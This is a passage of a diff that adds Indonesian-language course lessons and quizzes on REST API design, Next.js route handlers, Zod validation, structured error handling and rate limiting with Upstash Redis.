+            "question": "Berdasarkan standar industri RESTful API Design, pola penamaan URL endpoint manakah yang paling benar untuk mengambil detail data kursus dengan ID '101'?",
+            "options": [
+              "GET /api/v1/courses/101",
+              "GET /api/v1/getCourseDetailsById?id=101",
+              "POST /api/v1/fetchCourse/101",
+              "GET /api/v1/courses/show/101"
+            ],
+            "correctIndex": 0,
+            "explanation": "REST menggunakan kata benda jamak /courses/:id yang dipadukan dengan kata kerja HTTP GET untuk mengidentifikasi resource secara semantik."
+          },
+          {
+            "id": "q-17-1-2",
+            "question": "Apa perbedaan semantik antara HTTP Method PUT dan HTTP Method PATCH saat memperbarui data di server?",
+            "options": [
+              "PUT menggantikan seluruh entitas data secara utuh (full replace), sedangkan PATCH hanya memperbarui sebagian field properti yang dikirimkan (partial update).",
+              "PATCH menghapus data sedangkan PUT membuat data baru.",
+              "PUT hanya untuk database SQL dan PATCH untuk file JSON.",
+              "Keduanya adalah sinonim yang persis sama."
+            ],
+            "correctIndex": 0,
+            "explanation": "PUT mewajibkan pengiriman payload dokumen lengkap untuk penggantian total, sedangkan PATCH dirancang untuk modifikasi sebagian atribut."
+          },
+          {
+            "id": "q-17-1-3",
+            "question": "Apa yang dimaksud dengan konsep 'Idempotency' pada HTTP Method seperti GET, PUT, dan DELETE?",
+            "options": [
+              "Menjalankan request tersebut sebanyak 1 kali atau 100 kali akan menghasilkan status akhir database yang sama persis tanpa efek samping bertambah secara tidak sengaja.",
+              "Request hanya boleh dijalankan pada hari kerja.",
+              "Request otomatis menghapus histori browser.",
+              "Request membutuhkan password superuser."
+            ],
+            "correctIndex": 0,
+            "explanation": "Operasi idempotent menjamin keamanan pengulangan request (retry) saat koneksi jaringan terputus tanpa menciptakan duplikasi data."
+          }
+        ]
+      },
+      {
+        "id": "lesson-17-2",
+        "stageId": "stage-17",
+        "slug": "nextjs-route-handlers-get-post-put-delete",
+        "title": "Next.js Route Handlers (GET, POST, PUT, DELETE)",
+        "titleEn": "Next.js Route Handlers (route.ts)",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Membangun endpoint API di Next.js App Router dengan file khusus `route.ts`, mengekstrak Request params, JSON body, query searchParams, NextRequest vs NextResponse, dan CORS headers.",
+        "prerequisites": [
+          "rest-api-design-dan-http-semantics"
+        ],
+        "learningObjectives": [
+          "Membangun endpoint API menggunakan file konvensi khusus `route.ts` di dalam folder `app/api/`.",
+          "Mengekspor fungsi HTTP handler: GET, POST, PUT, PATCH, DELETE.",
+          "Membaca Query Parameters menggunakan `request.nextUrl.searchParams` dan membaca JSON body dengan `await request.json()`.",
+          "Mengembalikan respon JSON dan status code semantik menggunakan `NextResponse.json()`."
+        ],
+        "whyMatters": "Route Handlers memungkinkan Next.js bertindak sebagai backend API server mandiri untuk melayani web client, mobile apps, dan webhook eksternal.",
+        "careerContext": "Integrasi webhook pembayaran (Midtrans, Stripe) dan API publik dibangun di atas Next.js Route Handlers.",
+        "commonMistakes": [
+          "Menaruh file `page.tsx` dan `route.tsx` di dalam folder yang sama persis (Next.js melarang konflik ini: sebuah folder hanya boleh memiliki salah satu).",
+          "Lupa membungkus `await request.json()` di dalam blok `try-catch` (memicu unhandled JSON parse error jika client mengirim body kosong)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Route Handler (route.ts)",
+            "definition": "Konvensi file Next.js untuk membuat custom HTTP request handlers (pengganti API routes lama)."
+          },
+          {
+            "term": "NextRequest",
+            "definition": "Ekstensi dari objek Web Request standar dengan fitur helper tambahan seperti `.nextUrl` dan `.cookies`."
+          },
+          {
+            "term": "NextResponse",
+            "definition": "Ekstensi dari objek Web Response standar untuk memudahkan pengiriman JSON, redirects, dan cookies."
+          }
+        ],
+        "contentMd": "# Next.js Route Handlers (GET, POST, PUT, DELETE)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara membangun Backend REST API di Next.js 16 menggunakan konvensi file khusus **`route.ts`**, menangani method **GET, POST, PUT, DELETE**, mengekstrak **Query Parameters & Request Body**, serta mengirim respon dengan **`NextResponse`**.\n\n## Mengapa Konsep Ini Penting?\nNext.js bukan hanya framework frontend, tetapi juga **Fullstack Backend Framework**. Anda tidak perlu membuat server Express.js terpisah hanya untuk melayani webhook pembayaran Midtrans/Stripe atau menyediakan API publik untuk aplikasi Android/iOS Anda.\n\n## 1. Konvensi File `route.ts`\nBuat file bernama **`route.ts`** di dalam struktur folder rute `app/api/...`:\n\n```text\napp/\n└── api/\n    └── courses/\n        ├── route.ts              ──> /api/courses (GET all, POST new)\n        └── [id]/\n            └── route.ts          ──> /api/courses/:id (GET detail, PATCH, DELETE)\n```\n\n> **Aturan Wajib**: File `route.ts` **TIDAK BOLEH** berada di folder yang sama dengan file `page.tsx`.\n\n## 2. Contoh Lengkap: CRUD Route Handlers\n\n```typescript\n// File: app/api/courses/route.ts\nimport { NextRequest, NextResponse } from \"next/server\";\nimport { db } from \"@/lib/db\";\n\n// 1. GET HANDLER: Ambil Daftar Kursus dengan Filter Query\nexport async function GET(request: NextRequest) {\n  try {\n    // Ambil query parameter dari URL: /api/courses?kategori=frontend\n    const searchParams = request.nextUrl.searchParams;\n    const kategori = searchParams.get(\"kategori\");\n\n    const courses = await db.course.findMany({\n      where: kategori ? { category: kategori } : undefined,\n    });\n\n    return NextResponse.json({\n      success: true,\n      data: courses\n    }, { status: 200 });\n\n  } catch (error: any) {\n    return NextResponse.json({\n      success: false,\n      error: error.message\n    }, { status: 500 });\n  }\n}\n\n// 2. POST HANDLER: Buat Kursus Baru dari JSON Body\nexport async function POST(request: NextRequest) {\n  try {\n    // Ekstrak data JSON dari body request:\n    const body = await request.json();\n\n    if (!body.title || !body.description) {\n      return NextResponse.json({\n        success: false,\n        error: \"Field 'title' dan 'description' wajib diisi!\"\n      }, { status: 400 }); // Bad Request\n    }\n\n    const newCourse = await db.course.create({\n      data: {\n        title: body.title,\n        description: body.description\n      }\n    });\n\n    return NextResponse.json({\n      success: true,\n      data: newCourse,\n      message: \"Kursus berhasil dibuat\"\n    }, { status: 201 }); // 201 Created\n\n  } catch (error: any) {\n    return NextResponse.json({\n      success: false,\n      error: \"Gagal memproses JSON request\"\n    }, { status: 400 });\n  }\n}\n```\n\n## 3. Dynamic Route Handler (`app/api/courses/[id]/route.ts`)\n\n```typescript\n// File: app/api/courses/[id]/route.ts\nimport { NextRequest, NextResponse } from \"next/server\";\nimport { db } from \"@/lib/db\";\n\ninterface Context {\n  params: Promise<{ id: string }>;\n}\n\nexport async function DELETE(request: NextRequest, { params }: Context) {\n  const { id } = await params;\n\n  await db.course.delete({ where: { id } });\n\n  return NextResponse.json({\n    success: true,\n    message: `Kursus ID ${id} berhasil dihapus`\n  });\n}\n```\n\n## Kesalahan Umum Pemula\n- **Lupa awalan NextRequest**: Menggunakan tipe `Request` biasa alih-alih `NextRequest` sehingga kehilangan helper praktis seperti `request.nextUrl.searchParams`.\n\n## Praktik Mandiri\n1. Buat endpoint `GET /api/health` yang mengembalikan `{ status: 'ok', uptime: process.uptime() }`.\n2. Uji menggunakan browser atau aplikasi Postman.\n\n## Ringkasan\n- File **`route.ts`** mendefinisikan custom API endpoints di Next.js App Router.\n- Ekspor fungsi bernama sesuai HTTP Method: **`GET`**, **`POST`**, **`PATCH`**, **`DELETE`**.\n- Gunakan **`NextResponse.json(data, { status })`** untuk mengembalikan respon JSON standar.\n- Ekstrak query string via **`request.nextUrl.searchParams`** dan JSON body via **`await request.json()`**.",
+        "quizzes": [
+          {
+            "id": "q-17-2-1",
+            "question": "Nama file konvensi khusus apakah yang WAJIB digunakan di dalam folder Next.js App Router untuk membuat REST API endpoint?",
+            "options": [
+              "route.ts (atau route.js)",
+              "api.ts",
+              "server.ts",
+              "handler.ts"
+            ],
+            "correctIndex": 0,
+            "explanation": "route.ts adalah konvensi file resmi Next.js App Router untuk mendefinisikan API Route Handlers."
+          },
+          {
+            "id": "q-17-2-2",
+            "question": "Bagaimana cara membaca query string parameter (contoh: ?search=react) dari objek NextRequest di dalam fungsi GET handler?",
+            "options": [
+              "const query = request.nextUrl.searchParams.get('search');",
+              "const query = request.query.search;",
+              "const query = request.params.search;",
+              "const query = request.getSearchString();"
+            ],
+            "correctIndex": 0,
+            "explanation": "NextRequest memperluas Web Request dengan menyediakan properti nextUrl.searchParams untuk ekstraksi URL query params yang mudah."
+          },
+          {
+            "id": "q-17-2-3",
+            "question": "Apa yang terjadi jika Anda meletakkan file page.tsx dan file route.ts di dalam folder yang sama persis di Next.js App Router?",
+            "options": [
+              "Next.js akan melempar error konflik build karena satu folder hanya boleh bertindak sebagai Halaman UI (page) ATAU Endpoint API (route), tidak boleh keduanya sekaligus.",
+              "Next.js akan menggabungkan keduanya menjadi file video.",
+              "Halaman akan otomatis dialihkan ke Google.",
+              "Database akan ter-reset."
+            ],
+            "correctIndex": 0,
+            "explanation": "Next.js melarang konflik rute: sebuah segmen path hanya boleh merender tampilan visual (page.tsx) atau merespon HTTP handler (route.ts)."
+          }
+        ]
+      },
+      {
+        "id": "lesson-17-3",
+        "stageId": "stage-17",
+        "slug": "zod-schema-validation-dan-type-inference",
+        "title": "Skema Validasi Zod & Type Inference (z.infer)",
+        "titleEn": "Zod Schema Validation & Type Inference",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Memvalidasi input data backend dan formulir dengan Zod (z.object, z.string, z.email, z.min, z.refine), mengekstrak tipe TypeScript otomatis dengan z.infer<typeof Schema>, dan parse vs safeParse.",
+        "prerequisites": [
+          "nextjs-route-handlers-get-post-put-delete"
+        ],
+        "learningObjectives": [
+          "Mendefinisikan skema validasi runtime data yang ketat menggunakan Zod.",
+          "Mengekstrak tipe data TypeScript otomatis tanpa duplikasi kode menggunakan `z.infer<typeof Schema>`.",
+          "Membedakan method `schema.parse()` (melempar ZodError) vs `schema.safeParse()` (mengembalikan objek result `{ success, data, error }`).",
+          "Menerapkan aturan validasi khusus menggunakan `.refine()` (seperti pencocokan konfirmasi password)."
+        ],
+        "whyMatters": "Zod menghubungkan dunia validasi runtime (keamanan data masukan) dengan dunia static typing TypeScript dalam satu sumber kebenaran tunggal.",
+        "careerContext": "Zod adalah library validasi skema standar de facto di seluruh ekosistem Next.js, Server Actions, dan tRPC.",
+        "commonMistakes": [
+          "Menulis interface TypeScript manual dan menulis skema validasi Zod terpisah secara manual (duplikasi kode; selalu gunakan `z.infer`!).",
+          "Menggunakan `schema.parse()` tanpa blok try-catch yang menyebabkan unhandled 500 error."
+        ],
+        "keyTerms": [
+          {
+            "term": "Zod",
+            "definition": "TypeScript-first schema declaration and validation library with static type inference."
+          },
+          {
+            "term": "safeParse()",
+            "definition": "Method validasi Zod yang tidak melempar error, melainkan mengembalikan discriminated union result `{ success: true, data }` atau `{ success: false, error }`."
+          },
+          {
+            "term": "z.infer<T>",
+            "definition": "Utilitas Zod untuk mengekstrak tipe TypeScript secara otomatis dari skema Zod."
+          }
+        ],
+        "contentMd": "# Skema Validasi Zod & Type Inference (z.infer)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari library validasi skema nomor satu di ekosistem TypeScript: **Zod**. Anda akan menguasai cara membuat skema validasi input, mengekstrak tipe otomatis dengan **`z.infer`**, serta menangani hasil validasi dengan **`safeParse`**.\n\n## Mengapa Konsep Ini Penting?\nTypeScript hanya memeriksa tipe data saat koding (**Compile-Time**). Begitu aplikasi berjalan (**Runtime**), pengguna atau peretas bisa mengirimkan JSON apapun ke API Anda. Zod bertindak sebagai satpam gerbang yang memeriksa dan membersihkan data di runtime sekaligus menghasilkan tipe TypeScript secara otomatis!\n\n## 1. Mendefinisikan Skema Zod & Type Inference\n\n```typescript\nimport { z } from \"zod\";\n\n// 1. Definisikan Skema Validasi Runtime:\nexport const RegisterSchema = z.object({\n  username: z.string().min(3, \"Username minimal 3 karakter\").max(20),\n  email: z.string().email(\"Format email tidak valid\"),\n  password: z.string().min(8, \"Password minimal 8 karakter\"),\n  usia: z.number().int().min(17, \"Usia minimal 17 tahun\").optional(),\n});\n\n// 2. EKSTRAK TIPE TYPESCRIPT OTOMATIS (Single Source of Truth!):\n// Anda TIDAK PERLU lagi menulis interface RegisterDto manual!\nexport type RegisterInput = z.infer<typeof RegisterSchema>;\n```\n\n## 2. Memvalidasi Data: `parse()` vs `safeParse()`\n\n### A. `schema.parse()` (Melempar Exception)\nJika data tidak valid, `parse()` akan melempar `ZodError` (wajib ditangkap dengan blok `try-catch`):\n```typescript\ntry {\n  const dataBersih = RegisterSchema.parse(inputMentah);\n} catch (err) {\n  if (err instanceof z.ZodError) {\n    console.error(err.flatten().fieldErrors);\n  }\n}\n```\n\n### B. `schema.safeParse()` (SANGAT DIREKOMENDASIKAN!)\n`safeParse()` tidak melempar error, melainkan mengembalikan objek status yang aman:\n\n```typescript\nconst hasilValidasi = RegisterSchema.safeParse(inputMentah);\n\nif (!hasilValidasi.success) {\n  // Ambil daftar pesan error yang ramah pengguna:\n  const pesanError = hasilValidasi.error.flatten().fieldErrors;\n  console.log(\"Validasi Gagal:\", pesanError);\n  return { error: pesanError };\n}\n\n// Data di sini dijamin 100% valid dan bertipe RegisterInput:\nconsole.log(\"Data Valid:\", hasilValidasi.data.email);\n```\n\n## 3. Validasi Tingkat Lanjut: `.refine()` (Konfirmasi Password)\nGunakan `.refine()` untuk validasi lintas-kolom:\n\n```typescript\nexport const ResetPasswordSchema = z.object({\n  passwordBaru: z.string().min(8),\n  konfirmasiPassword: z.string()\n}).refine(data => data.passwordBaru === data.konfirmasiPassword, {\n  message: \"Konfirmasi password tidak cocok dengan password baru!\",\n  path: [\"konfirmasiPassword\"] // Tempelkan error ke field konfirmasiPassword\n});\n```\n\n## Kesalahan Umum Pemula\n- **Menduplikasi interface manual**: Menulis `interface User { ... }` lalu menulis `const UserSchema = z.object({ ... })` secara terpisah. Cukup tulis skema Zod dan gunakan `type User = z.infer<typeof UserSchema>`.\n\n## Praktik Mandiri\n1. Buat skema Zod untuk form pembuatan artikel (title minimal 5 huruf, content minimal 20 huruf, tags array string).\n2. Uji data dengan `safeParse()` dan tangani pesan errornya.\n\n## Ringkasan\n- **Zod** menggabungkan validasi data runtime dengan sistem pengetikan statis TypeScript.\n- Gunakan **`z.infer<typeof Schema>`** untuk mengekstrak tipe data otomatis (*DRY principle*).\n- Selalu prioritaskan **`safeParse()`** untuk evaluasi validasi yang aman tanpa exception crash.\n- Gunakan **`.refine()`** untuk logika validasi khusus seperti kecocokan konfirmasi password.",
+        "quizzes": [
+          {
+            "id": "q-17-3-1",
+            "question": "Bagaimana cara mengekstrak tipe data TypeScript secara otomatis dari sebuah skema Zod tanpa perlu menulis interface manual secara terpisah?",
+            "options": [
+              "type UserDto = z.infer<typeof UserSchema>;",
+              "type UserDto = UserSchema.getType();",
+              "type UserDto = typeof UserSchema;",
+              "type UserDto = z.extract(UserSchema);"
+            ],
+            "correctIndex": 0,
+            "explanation": "z.infer<typeof Schema> mengekstrak tipe static TypeScript langsung dari definisi skema runtime Zod, menjamin single source of truth."
+          },
+          {
+            "id": "q-17-3-2",
+            "question": "Apa keunggulan menggunakan schema.safeParse(data) dibandingkan schema.parse(data) pada Zod?",
+            "options": [
+              "safeParse tidak melempar exception crash runtime, melainkan mengembalikan objek status { success: true, data } atau { success: false, error } yang aman dan mudah dievaluasi.",
+              "safeParse mengeksekusi validasi 100 kali lebih lambat.",
+              "safeParse hanya bisa digunakan untuk angka genap.",
+              "safeParse otomatis menyimpan data ke harddisk."
+            ],
+            "correctIndex": 0,
+            "explanation": "safeParse mengembalikan discriminated union result yang mengeliminasi kebutuhan penulisan blok try-catch yang berulang."
+          },
+          {
+            "id": "q-17-3-3",
+            "question": "Method Zod apakah yang digunakan untuk membuat aturan validasi kustom (seperti memastikan konfirmasi password sama dengan password baru)?",
+            "options": [
+              ".refine(callback, options)",
+              ".customCheck(callback)",
+              ".validateIf(callback)",
+              ".matchWith(callback)"
+            ],
+            "correctIndex": 0,
+            "explanation": ".refine(fn, { message, path }) memungkinkan pembuatan aturan validasi kustom tingkat lanjut lintas properti pada skema Zod."
+          }
+        ]
+      },
+      {
+        "id": "lesson-17-4",
+        "stageId": "stage-17",
+        "slug": "penanganan-error-terstruktur-dan-http-status-codes",
+        "title": "Penanganan Error Terstruktur & HTTP Status Codes",
+        "titleEn": "Structured Error Handling & Status Codes",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Membangun standar penanganan error backend: Custom API Error Classes, pemetaan kode status HTTP (400, 401, 403, 404, 409 Conflict, 422 Unprocessable, 500), dan response sanitization.",
+        "prerequisites": [
+          "zod-schema-validation-dan-type-inference"
+        ],
+        "learningObjectives": [
+          "Membangun Custom Error hierarchy (`ApiError`, `BadRequestError`, `UnauthorizedError`, `NotFoundError`).",
+          "Memetakan skenario bisnis ke kode status HTTP yang tepat (409 untuk email duplikat, 422 untuk validasi gagal).",
+          "Menerapkan sanitasi pesan error agar stack trace rahasia database tidak bocor ke pengguna luar di lingkungan produksi."
+        ],
+        "whyMatters": "Penanganan error yang terstruktur mencegah kebocoran informasi keamanan sistem (database schema exposure) dan memudahkan frontend menampilkan pesan error yang tepat.",
+        "careerContext": "Arsitektur error handling terpusat adalah tanda kematangan sistem backend kelas enterprise.",
+        "commonMistakes": [
+          "Mengembalikan pesan error mentah database (`error.message` dari PostgreSQL) langsung ke respon publik.",
+          "Mengembalikan `200 OK` dengan body `{ status: 'error' }` (anti-pattern yang merusak caching dan API monitoring)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Custom Error Class",
+            "definition": "Kelas turunan dari `Error` bawaan yang menyimpan metadata kode status HTTP dan kode error terstruktur."
+          },
+          {
+            "term": "409 Conflict",
+            "definition": "Kode status HTTP yang menandakan konflik data (seperti email atau username sudah terdaftar)."
+          },
+          {
+            "term": "Error Sanitization",
+            "definition": "Penyaringan pesan error teknis agar tidak mengekspos struktur internal server ke publik."
+          }
+        ],
+        "contentMd": "# Penanganan Error Terstruktur & HTTP Status Codes\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari arsitektur **Penanganan Error Terstruktur**: membuat **Custom API Error Classes**, pemetaan semantik **HTTP Status Codes**, serta teknik **Sanitasi Error Produksi** untuk melindungi keamanan server.\n\n## Mengapa Konsep Ini Penting?\nJika server mengalami error database dan Anda langsung mengembalikan `res.json({ error: err.message })`, peretas dapat membaca nama tabel, query SQL, dan struktur server Anda. Error harus ditangkap, dicatat (*logged*) di server, dan dikembalikan ke pengguna dalam format standar yang aman.\n\n## 1. Membangun Custom API Error Class\n\n```typescript\n// File: src/lib/errors.ts\nexport class ApiError extends Error {\n  public readonly statusCode: number;\n  public readonly errorCode: string;\n\n  constructor(statusCode: number, message: string, errorCode: string = \"API_ERROR\") {\n    super(message);\n    this.statusCode = statusCode;\n    this.errorCode = errorCode;\n    Object.setPrototypeOf(this, new.target.prototype);\n  }\n}\n\n// Error Khusus Turunan:\nexport class BadRequestError extends ApiError {\n  constructor(message: string = \"Permintaan data tidak valid\") {\n    super(400, message, \"BAD_REQUEST\");\n  }\n}\n\nexport class UnauthorizedError extends ApiError {\n  constructor(message: string = \"Sesi telah berakhir, silakan login kembali\") {\n    super(401, message, \"UNAUTHORIZED\");\n  }\n}\n\nexport class NotFoundError extends ApiError {\n  constructor(message: string = \"Data tidak ditemukan\") {\n    super(404, message, \"NOT_FOUND\");\n  }\n}\n\nexport class ConflictError extends ApiError {\n  constructor(message: string = \"Data sudah terdaftar di sistem\") {\n    super(409, message, \"RESOURCE_CONFLICT\");\n  }\n}\n```\n\n## 2. Wrapper Penanganan Error Terpusat pada Route Handlers\n\n```typescript\n// File: src/lib/apiHandler.ts\nimport { NextResponse } from \"next/server\";\nimport { ApiError } from \"./errors\";\nimport { ZodError } from \"zod\";\n\nexport function handleApiError(error: unknown) {\n  // 1. Error Bisnis Kustom Kita:\n  if (error instanceof ApiError) {\n    return NextResponse.json({\n      success: false,\n      error: { code: error.errorCode, message: error.message }\n    }, { status: error.statusCode });\n  }\n\n  // 2. Error Validasi Zod:\n  if (error instanceof ZodError) {\n    return NextResponse.json({\n      success: false,\n      error: {\n        code: \"VALIDATION_ERROR\",\n        message: \"Data input tidak memenuhi syarat\",\n        details: error.flatten().fieldErrors\n      }\n    }, { status: 422 }); // Unprocessable Entity\n  }\n\n  // 3. Error Fatal Tak Terduga (Sanitasi untuk Keamanan!):\n  console.error(\"FATAL INTERNAL SERVER ERROR:\", error); // Catat log internal rahasia\n  \n  return NextResponse.json({\n    success: false,\n    error: {\n      code: \"INTERNAL_SERVER_ERROR\",\n      message: \"Terjadi kesalahan pada server kami. Silakan coba lagi nanti.\"\n    }\n  }, { status: 500 });\n}\n```\n\n## 3. Penerapan Bersih di Route Handler\n\n```typescript\n// File: app/api/auth/register/route.ts\nimport { NextRequest, NextResponse } from \"next/server\";\nimport { RegisterSchema } from \"@/lib/schemas\";\nimport { ConflictError } from \"@/lib/errors\";\nimport { handleApiError } from \"@/lib/apiHandler\";\nimport { db } from \"@/lib/db\";\n\nexport async function POST(req: NextRequest) {\n  try {\n    const rawBody = await req.json();\n    const data = RegisterSchema.parse(rawBody); // Otomatis lempar ZodError jika salah\n\n    // Cek duplikasi email di database:\n    const userAda = await db.user.findUnique({ where: { email: data.email } });\n    if (userAda) {\n      throw new ConflictError(\"Email ini sudah digunakan oleh akun lain!\");\n    }\n\n    const userBaru = await db.user.create({ data });\n\n    return NextResponse.json({ success: true, data: userBaru }, { status: 201 });\n\n  } catch (error) {\n    return handleApiError(error); // Ditangani terpusat & aman!\n  }\n}\n```\n\n## Kesalahan Umum Pemula\n- **Membocorkan Database Error**: Menampilkan `PrismaClientKnownRequestError` langsung ke frontend. Selalu gunakan error wrapper yang menyaring pesan error sensitif.\n\n## Praktik Mandiri\n1. Buat Custom Error `ForbiddenError` (Status 403).\n2. Tangkap error tersebut di `handleApiError` dan verifikasi respon statusnya.\n\n## Ringkasan\n- Gunakan **Custom Error Classes** untuk mengelola error bisnis secara semantik.\n- **400** (Bad Request), **401** (Unauthorized), **404** (Not Found), **409** (Conflict Email Duplikat), **422** (Zod Validation Error), **500** (Internal Server Error).\n- Selalu lakukan **Sanitasi Error** pada status 500 untuk melindungi kerahasiaan infrastruktur database.",
+        "quizzes": [
+          {
+            "id": "q-17-4-1",
+            "question": "Kode status HTTP manakah yang paling tepat dan semantik digunakan saat pengguna mencoba mendaftar akun baru dengan email yang ternyata sudah terdaftar sebelumnya di database?",
+            "options": [
+              "409 Conflict",
+              "200 OK",
+              "404 Not Found",
+              "500 Internal Server Error"
+            ],
+            "correctIndex": 0,
+            "explanation": "HTTP 409 Conflict secara spesifik mengindikasikan bahwa permintaan tidak dapat diproses akibat adanya konflik status pada database (seperti duplikasi data unik)."
+          },
+          {
+            "id": "q-17-4-2",
+            "question": "Mengapa pesan error mentah dari database (seperti stack trace SQL/Prisma) TIDAK BOLEH dikirimkan langsung ke respon publik pengguna pada status 500?",
+            "options": [
+              "Karena membocorkan informasi sensitif arsitektur internal server (nama tabel, query SQL, versi database) yang dapat dieksploitasi oleh peretas untuk melancarkan serangan.",
+              "Karena browser akan memblokir koneksi internet.",
+              "Karena pesan error database menggunakan bahasa Latin kuno.",
+              "Karena ukuran pesan error melebihi batas 100 karakter."
+            ],
+            "correctIndex": 0,
+            "explanation": "Error sanitization adalah prinsip pertahanan keamanan untuk menyembunyikan detail infrastruktur internal dari pandangan publik."
+          },
+          {
+            "id": "q-17-4-3",
+            "question": "Kode status HTTP berapakah yang standar industri gunakan untuk mengindikasikan bahwa data input JSON yang dikirimkan klien gagal melewati aturan validasi skema (Zod Validation Error)?",
+            "options": [
+              "422 Unprocessable Entity (atau 400 Bad Request)",
+              "201 Created",
+              "304 Not Modified",
+              "502 Bad Gateway"
+            ],
+            "correctIndex": 0,
+            "explanation": "HTTP 422 Unprocessable Entity menandakan sintaks JSON terbaca namun isi data melanggar aturan validasi semantik."
+          }
+        ]
+      },
+      {
+        "id": "lesson-17-5",
+        "stageId": "stage-17",
+        "slug": "rate-limiting-dan-api-protection-upstash",
+        "title": "Rate Limiting & Perlindungan API (Upstash Redis)",
+        "titleEn": "Rate Limiting & API Protection",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Melindungi endpoint API backend dari serangan brute-force dan DDoS menggunakan Rate Limiting berbasis IP/User token dengan Upstash Redis dan Sliding Window algorithm.",
+        "prerequisites": [
+          "penanganan-error-terstruktur-dan-http-status-codes"
+        ],
+        "learningObjectives": [
+          "Menjelaskan ancaman brute-force attacks, API scraping, dan DDoS pada endpoint publik.",
+          "Menerapkan algoritma Sliding Window Rate Limiting menggunakan Redis (@upstash/ratelimit).",
+          "Mengekstrak IP address klien dari request headers (x-forwarded-for).",
+          "Mengembalikan respon HTTP 429 Too Many Requests dan headers pembatas (Retry-After, X-RateLimit-Remaining)."
+        ],
+        "whyMatters": "Tanpa Rate Limiting, bot otomatis dapat membombardir endpoint login atau endpoint AI Anda hingga server down dan biaya tagihan membengkak jutaan rupiah.",
+        "careerContext": "Mengamankan API publik dari penyalahgunaan adalah tanggung jawab utama Backend / Security Engineer.",
+        "commonMistakes": [
+          "Menyimpan data rate limit di memori RAM serverless (pada serverless, memori RAM di-reset setiap invocation; rate limiter WAJIB menggunakan external memory seperti Redis).",
+          "Tidak menyertakan header `Retry-After` saat mengembalikan status 429."
+        ],
+        "keyTerms": [
+          {
+            "term": "Rate Limiting",
+            "definition": "Mekanisme pembatasan jumlah permintaan (request) yang boleh dilakukan oleh satu pengguna/IP dalam jangka waktu tertentu."
+          },
+          {
+            "term": "HTTP 429 Too Many Requests",
+            "definition": "Kode status resmi penanda bahwa klien telah melampaui batas kuota permintaan yang diizinkan."
+          },
+          {
+            "term": "Sliding Window Algorithm",
+            "definition": "Algoritma rate limiter paling akurat yang menghitung rata-rata frekuensi request berdasarkan pergeseran jendela waktu bergerak."
+          }
+        ],
+        "contentMd": "# Rate Limiting & Perlindungan API (Upstash Redis)\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan mempelajari cara mengamankan Backend API dari serangan **Brute-Force Login**, **Bot Spamming**, dan **DDoS**: mengimplementasikan **Rate Limiting** berbasis **Upstash Redis** menggunakan algoritma **Sliding Window**, serta merespon dengan status **HTTP 429 (Too Many Requests)**.\n\n## Mengapa Konsep Ini Penting?\nJika endpoint `POST /api/auth/login` Anda tidak dilindungi, peretas bisa menjalankan skrip bot yang mencoba 10.000 kombinasi password per detik hingga akun pengguna jebol. Rate Limiting membatasi percobaan maksimal (misal: hanya 5 kali percobaan per menit per alamat IP).\n\n## 1. Mengapa Butuh Redis di Arsitektur Serverless?\nDi lingkungan Serverless (Vercel / AWS Lambda), setiap request bisa dieksekusi di server/kontainer yang berbeda. Variabel lokal di memori JavaScript akan hilang saat fungsi selesai. Kita membutuhkan **Serverless Redis Terpusat (seperti Upstash Redis)** untuk melacak hitungan request lintas server secara instan dalam $< 2$ms.\n\n## 2. Mengonfigurasi Upstash Ratelimit\n\n```bash\nnpm install @upstash/ratelimit @upstash/redis\n```\n\n```typescript\n// File: src/lib/ratelimit.ts\nimport { Ratelimit } from \"@upstash/ratelimit\";\nimport { Redis } from \"@upstash/redis\";\n\n// Inisialisasi koneksi Redis dari Environment Variables:\nconst redis = new Redis({\n  url: process.env.UPSTASH_REDIS_REST_URL!,\n  token: process.env.UPSTASH_REDIS_REST_TOKEN!,\n});\n\n// Batasi: Maksimal 5 Request per 60 Detik per Identifier (Sliding Window):\nexport const authRateLimiter = new Ratelimit({\n  redis,\n  limiter: Ratelimit.slidingWindow(5, \"60 s\"),\n  analytics: true,\n  prefix: \"ratelimit:auth\",\n});\n```\n\n## 3. Penerapan di Route Handler Next.js\n\n```typescript\n// File: app/api/auth/login/route.ts\nimport { NextRequest, NextResponse } from \"next/server\";\nimport { authRateLimiter } from \"@/lib/ratelimit\";\n\nexport async function POST(req: NextRequest) {\n  // 1. Ekstrak Alamat IP Pengguna dari Header:\n  const ip = req.headers.get(\"x-forwarded-for\")?.split(\",\")[0] ?? \"127.0.0.1\";\n\n  // 2. Periksa Limit di Redis:\n  const { success, limit, remaining, reset } = await authRateLimiter.limit(ip);\n\n  // 3. JIKA KUOTA HABIS -> TOLAK DENGAN HTTP 429:\n  if (!success) {\n    return NextResponse.json({\n      success: false,\n      error: \"Terlalu banyak percobaan login. Silakan tunggu beberapa saat lagi.\"\n    }, {\n      status: 429, // 429 Too Many Requests\n      headers: {\n        \"X-RateLimit-Limit\": limit.toString(),\n        \"X-RateLimit-Remaining\": remaining.toString(),\n        \"X-RateLimit-Reset\": reset.toString(),\n      }\n    });\n  }\n\n  // 4. Lanjutkan Proses Login Normal:\n  return NextResponse.json({ success: true, message: \"Login berhasil diproses\" });\n}\n```\n\n## Kesalahan Umum Pemula\n- **Menyimpan hitungan di variabel global `let counter = 0`**: Di serverless, variabel ini akan di-reset setiap kali fungsi server tidur (*cold start*), sehingga proteksi rate limit menjadi tidak berguna.\n\n## Praktik Mandiri\n1. Pasang rate limiter pada endpoint API kalkulator AI (misal 10 request per jam).\n2. Uji tembak 11 request berturut-turut dan verifikasi kemunculan error 429 pada request ke-11.\n\n## Ringkasan\n- **Rate Limiting** melindungi API dari brute-force, scraping, dan lonjakan biaya server.\n- Di lingkungan serverless, gunakan database in-memory terpusat seperti **Upstash Redis**.\n- Algoritma **Sliding Window** memberikan perhitungan kuota paling akurat dan adil.\n- Kembalikan kode status resmi **HTTP 429 Too Many Requests** saat kuota terlampaui.",
+        "quizzes": [
+          {
+            "id": "q-17-5-1",
